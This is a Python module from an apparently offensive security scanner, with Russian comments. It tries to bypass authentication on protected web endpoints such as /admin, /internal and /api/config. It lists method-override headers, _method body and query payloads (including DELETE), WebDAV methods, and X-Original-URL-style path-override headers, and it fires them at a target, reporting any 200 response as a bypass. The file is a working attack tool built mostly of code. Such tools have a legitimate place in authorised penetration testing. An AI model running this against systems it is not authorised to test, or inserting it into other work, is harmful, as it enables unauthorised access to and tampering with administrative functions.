"""http_method_override v2 — method/path override to bypass auth (with verify).

Техники:
  1. 8 override headers (X-HTTP-Method-Override: DELETE/GET/PUT/PATCH, ...)
  2. 6 body/query _method forms (Rails/Spring/Symfony pattern)
  3. WebDAV методы (PROPFIND, MKCOL, COPY, MOVE, LOCK)
  4. Path override headers (X-Original-URL, X-Rewrite-URL, ...)

Verify: baseline = 401/403/405 на прямом методе,
        с override = 200 → bypass confirmed
"""
import secrets
from core.http import HttpClient
from core.verify import confidence, is_signal


# 8 форм override-заголовков
OVERRIDE_HEADERS = [
    ("X-HTTP-Method-Override", "DELETE"),
    ("X-HTTP-Method-Override", "PUT"),
    ("X-HTTP-Method-Override", "PATCH"),
    ("X-HTTP-Method-Override", "GET"),       # CSRF bypass
    ("X-HTTP-Method", "DELETE"),
    ("X-HTTP-Method", "PUT"),
    ("X-Method-Override", "DELETE"),
    ("X-Original-Method", "DELETE"),
]

# body/query _method паттерны
BODY_OVERRIDES = [
    {"_method": "DELETE"},
    {"_method": "PUT"},
    {"_method": "PATCH"},
    {"method": "DELETE"},
    {"http_method": "DELETE"},
    {"_HttpMethod": "DELETE"},
]

QUERY_OVERRIDES = [
    "_method=DELETE",
    "_method=PUT",
    "method=DELETE",
    "http_method=DELETE",
]

# WebDAV методы
WEBDAV_METHODS = ["PROPFIND", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK"]

# path override headers
PATH_OVERRIDE_HEADERS = [
    "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Path", "X-Override-URL",
    "X-Original-Path", "X-Original-URI",
]

# чувствительные пути для проверки
SENSITIVE_PATHS = [
    "/admin", "/admin/", "/administrator", "/manager", "/console",
    "/internal", "/debug", "/metrics", "/api/admin", "/api/users",
    "/api/users/1", "/account", "/settings", "/api/settings",
    "/api/config", "/dashboard", "/api/me", "/private",
]


class HttpMethodOverride:
    def run(self, session, logger):
        base = session.target.rstrip("/")
        http = HttpClient(session, logger)

        print(f"[method_override v2] target: {base}")

        # === baseline: какие endpoints требуют auth ===
        protected = []
        for path in SENSITIVE_PATHS:
            url = base + path
            try:
                r = http.get(url, allow_redirects=False)
            except Exception:
                continue
            if not r:
                continue
            if r.status_code in (401, 403, 405):
                protected.append((path, r.status_code))
                print(f"[method_override v2] protected: {path} ({r.status_code})")

        if not protected:
            print(f"[method_override v2] no protected endpoints found — skip")
            return {"findings": []}

        findings = []

        # === Phase 1: header-based override ===
        print()
        print(f"[method_override v2] Phase 1: header override")
        for path, base_code in protected:
            url = base + path
            for h, v in OVERRIDE_HEADERS:
                # POST с override header
                try:
                    r = http.post(url, headers={h: v}, data={"x": "1"},
                                  allow_redirects=False)
                except Exception:
                    continue
                if not r or r.status_code != 200:
                    continue

                # verify ×2
                try:
                    r2 = http.post(url, headers={h: v}, data={"x": "1"},
                                   allow_redirects=False)
                except Exception:
                    r2 = None
                if not r2 or r2.status_code != 200:
                    continue

                # 200 + размер отличается от baseline (значит реальный контент)
                if r2.status_code == 200 and len(r2.content) > 100:
                    conf = confidence(0.9, 1.0)
                    if not is_signal(conf, floor=0.55, module="method_override"):
                        continue
                    findings.append({
                        "type": "header_override_bypass",
                        "severity": "high",
                        "path": path,
                        "header": h,
                        "value": v,
                        "baseline_code": base_code,
                        "result_code": r2.status_code,
                        "size": len(r2.content),
                        "verified": True,
                        "confidence": conf,
                    })
                    print(f"  ✓ {h}: {v} → {base_code}→200 on {path}")
                    logger.finding("method_override", "high",
                                   f"{path} {h}:{v} {base_code}->200")
                    break

        # === Phase 2: body _method override ===
        print()
        print(f"[method_override v2] Phase 2: body _method")
        for path, base_code in protected:
            url = base + path
            for body in BODY_OVERRIDES:
                try:
                    r = http.post(url, data=body, allow_redirects=False)
                except Exception:
                    continue
                if not r or r.status_code != 200 or len(r.content) < 100:
                    continue

                try:
                    r2 = http.post(url, data=body, allow_redirects=False)
                except Exception:
                    r2 = None
                if not r2 or r2.status_code != 200:
                    continue

                conf = confidence(0.85, 1.0)
                if not is_signal(conf, floor=0.55, module="method_override"):
                    continue
                findings.append({
                    "type": "body_method_override",
                    "severity": "high",
                    "path": path,
                    "body": body,
                    "baseline_code": base_code,
                    "verified": True,
                    "confidence": conf,
                })
                print(f"  ✓ body {body} → {base_code}→200 on {path}")
                logger.finding("method_override", "high",
                               f"{path} body {body}")
                break

        # === Phase 3: query _method ===
        print()
        print(f"[method_override v2] Phase 3: query _method")
        for path, base_code in protected:
            url = base + path
            for qs in QUERY_OVERRIDES:
                test_url = url + ("&" if "?" in url else "?") + qs
                try:
                    r = http.post(test_url, data={"x": "1"}, allow_redirects=False)
                except Exception:
                    continue
                if not r or r.status_code != 200 or len(r.content) < 100:
                    continue

                try:
                    r2 = http.post(test_url, data={"x": "1"}, allow_redirects=False)
                except Exception:
                    r2 = None
                if not r2 or r2.status_code != 200:
                    continue

                conf = confidence(0.85, 1.0)
                if not is_signal(conf, floor=0.55, module="method_override"):
                    continue
                findings.append({
                    "type": "query_method_override",
                    "severity": "high",
                    "path": path,
                    "query": qs,
                    "baseline_code": base_code,
                    "verified": True,
                    "confidence": conf,
                })
                print(f"  ✓ query {qs} → {base_code}→200 on {path}")
                logger.finding("method_override", "high",
                               f"{path} query {qs}")
                break

        # === Phase 4: WebDAV methods ===
        print()
        print(f"[method_override v2] Phase 4: WebDAV methods")
        for path, base_code in protected:
            url = base + path
            for method in WEBDAV_METHODS:
                try:
                    r = http._req(method, url, allow_redirects=False)
                except Exception:
                    continue
                if r and r.status_code == 200 and len(r.content) > 100:
                    conf = confidence(0.85, 1.0)
                    if not is_signal(conf, floor=0.55, module="method_override"):
                        continue
                    findings.append({
                        "type": "webdav_bypass",
                        "severity": "high",
                        "path": path,
                        "method": method,
                        "baseline_code": base_code,
                        "confidence": conf,
                    })
                    print(f"  ✓ {method} → 200 on {path}")
                    logger.finding("method_override", "high",
                                   f"{path} WebDAV {method}")
                    break

        # === Phase 5: path override ===
        print()
        print(f"[method_override v2] Phase 5: path override")
        for path, _base_code in protected:
            for h in PATH_OVERRIDE_HEADERS:
                try:
                    r = http.get(base, headers={h: path}, allow_redirects=False)
                except Exception:
                    continue
                if not r or r.status_code != 200 or len(r.content) < 100:
                    continue
                # строгая проверка: заголовок "admin" + реальный контент
                body = r.text or ""
                # ищем признаки админ-страницы
                admin_markers = ["logout", "sign out", "dashboard",
                                 "administrator", "admin panel",
                                 "settings", "manage"]
                hit = any(m in body.lower() for m in admin_markers)
                if not hit:
                    continue

                conf = confidence(0.8, 1.0)
                if not is_signal(conf, floor=0.55, module="method_override"):
                    continue
                findings.append({
                    "type": "path_override_bypass",
                    "severity": "high",
                    "path": path,
                    "header": h,
                    "confidence": conf,
                })
                print(f"  ✓ {h}: {path} → admin content")
                logger.finding("method_override", "high",
                               f"path override {h} {path}")
                break

        # === Итог ===
        print()
        print(f"[method_override v2] findings: {len(findings)}")
        return {
            "findings": findings,
            "protected_endpoints": len(protected),
        }
